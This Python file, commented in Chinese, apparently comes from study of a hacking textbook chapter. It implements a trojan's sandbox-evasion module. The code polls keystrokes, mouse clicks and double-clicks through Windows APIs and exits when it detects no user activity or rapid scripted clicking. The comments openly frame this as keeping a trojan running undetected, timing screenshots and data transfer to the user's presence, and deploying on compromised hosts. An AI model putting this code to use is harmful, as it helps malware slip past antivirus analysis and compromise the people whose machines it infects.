# -*- coding:utf8 -*-

"""
        防病毒软件越来越多地使用了某种类型的沙盒来检测可疑样本的行为。无论这种沙盒是否运行在网络边界上
    （这种行为越来越流行），或者就在目标机器本身上运行，我们都必须尽最大努力避免目标网络上可能的防御，
    我们可以使用一些标识来尝试确定我们的木马是否运行沙盒内部。我们将会监视目标机器最近的用户输入，
    包括键盘键入和鼠标点击.
        下面我们将添加代码来搜寻键盘时间，鼠标点击和双击事件。我们的脚本还尝试判断沙盒的管理者是否在
    重复发送输入信号（例如，可疑的快速持续的鼠标点击），管理者通过这种行为调用原始的沙盒检测方法。我们
    将对用户与机器最后交互的时间于机器已经开机运行的时间进行对比，这是判断我们是否在沙盒内部运行的极好
    方式。
        正常的机器在启动之后，用户可能在一天的某些时间点上频繁地与机器进行交互,但在沙盒环境中通常没
    有用户的交互，这是因为沙盒通常被用来自动地对恶意软件进行分析.
        如果你频繁地使用了沙盒，说明你正在查杀电脑.
"""
import ctypes
import random
import time
import sys

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# 用于记录鼠标单击，键盘按键和双击的总数量
keystrokes = 0
mouse_clicks = 0
double_clicks = 0


#   定义LASTINPUTINFO结构体
#   它用来保存系统检测到的最后输入事件的时间戳（以毫秒为单位）
class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [
        ("cbsize", ctypes.c_uint),  # 结构体大小
        ("dwTime", ctypes.c_ulong)  # 系统最后输入时间
    ]


def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    #   需要在调用函数写入时间戳之前，进行初始化 cbSize 变量，将它设置成结构体的大小.
    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)

    #   获得用户最后输入的相关信息
    #   将系统最后输入事件的时间填充到struct_lastinputinfo.dwTime 字段中
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

    #   获取系统开机以来的时间
    run_time = kernel32.GetTickCount()

    elapsed = run_time - struct_lastinputinfo.dwTime
    print("[*] It's been %d milliseconds since the last input event." % elapsed)

    return elapsed


#   测试后删除下面代码，这只是测试上面代码能否运行成功
#   测试一下通过它确定在脚本的运行期间是否可以移动鼠标，敲击键盘上的按键，然后观察代码的输出
# while True:
#     get_last_input()
#     time.sleep(1)

"""
        下一步我们将定义一些与用户输入相关的阈值，这些值在我们获得系统运行的时间和用户最后输入的时间
    之前没有意义，因为上述的两个时间于目标系统的环境及我们攻破目标系统的方法有关，不同的攻击方法可能
    设置的阈值都不一样.举例来说，如果你仅仅通过钓鱼的方式对木马进行嵌入，那么用户很可能需要通过点击或
    进行某种操作才能被感染.
        
        相同的技术在我们判断系统是否处于待机状态时也非常有用。你可能仅仅需要在用户使用系统期间才对屏幕
    进行抓屏。同样，你也可能只在用户下线的时候才开始传输数据或进行一些其他的任务。除了上面的技术之外，
    你还可以在一段时间内对用户的行为进行建模，以确定用户通常在线的日期和时间。
       添加一些额外的代码来判断用户的按键和鼠标点击。与之前使用的PyHook库的方法不同，这里我们仅仅使用
    ctypes的解决方案。你也可以在这里使用PyHook库达到相同的目的，
    但在相同的模式块中使用两种不同的技术，可能会让杀毒软件和沙盒更容易对你的行为进行识别。
"""


def get_key_press():
    #   这就意味着在木马运行之前的一两分钟之内，目标系统都有用户的输入。在这种情况
    #   下,如果你发现目标系统已经启动了10分钟，但用户最后的输入也在10分钟之前，你应该意识到你很可能运行
    #   在沙盒的内部，它不发起任何用户输入。这样的判断策略是一款优秀的木马长时间运行的保证。
    global mouse_clicks
    global keystrokes
    #   我们对所有可用的键的范围进行迭代
    for i in range(0, 0xff):
        # 检测某个按键是否被按下
        if user32.GetAsyncKeyState(i) == -32767:
            # 左键点击为“0x1”
            if i == 0x1:
                # 鼠标单击的数目和时间
                mouse_clicks += 1
                return time.time()
            # 键盘ASCII按键是从23-127（具体可看ASCII表），为可打印字符，这就获取了键盘的敲击次数
            elif i > 32 and i < 127:
                keystrokes += 1

    return None


def detect_sandbox():
    global mouse_clicks
    global keystrokes

    # 定义键盘，单击，双击的最大值（阀值）
    max_keystrokes = random.randint(10, 25)
    max_mouse_clicks = random.randint(5, 25)
    max_double_clicks = 10

    double_clicks = 0
    double_click_threshold = 0.250  # 秒为单位
    first_double_click = None

    average_mousetime = 0
    max_input_threshold = 30000  # 毫秒为单位

    previous_timestamp = None
    detection_complete = False

    # 获取用户最后一次输入之后经历的时间
    last_input = get_last_input()

    # 超过设定的阀值时强制退出，就是用户最后一次输入之后经历的时间太长，都没用户活动了
    if last_input >= max_input_threshold:
        sys.exit(0)

    # 循环检测
    while not detection_complete:

        # 获取按下鼠标的时间，不懂的看函数的返回值
        keypress_time = get_key_press()

        if keypress_time is not None and previous_timestamp is not None:
            # 计算两次点击的相隔时间
            elapsed = keypress_time - previous_timestamp
            # 间隔时间短的话，则为用户双击
            if elapsed <= double_click_threshold:
                double_clicks += 1
                if first_double_click is None:
                    # 获取第一次双击的时间
                    first_double_click = time.time()
                else:
                    # 是否是沙盒的管理者在沙盒中模仿用户的点击（因为普通用户通常不会双击这么多）
                    if double_clicks == max_double_clicks:
                        # 短时间内，鼠标点击达到了我们设定的最大值（最大次数*双击间隔）
                        if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
                            sys.exit(0)
            # 是否达到了我们检测的最大数量，是就退出
            if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
                return

            previous_timestamp = keypress_time
        elif keypress_time is not None:
            previous_timestamp = keypress_time


detect_sandbox()
print("We are Ok!")

"""
    后话：
            可以稍微调整代码中的一些设置，或者添加一些额外的功能，如虚拟机检测等。你可以在多台计算机上
        追踪鼠标点击，双击，键盘按键等一些常见的使用场景（用自己的计算机）
            本章中开发的工具可以作为木马最基本的功能使用，由于我们的木马框架使用了模块化的设计，
        所以你可以在任何木马被控端上部署他们.
"""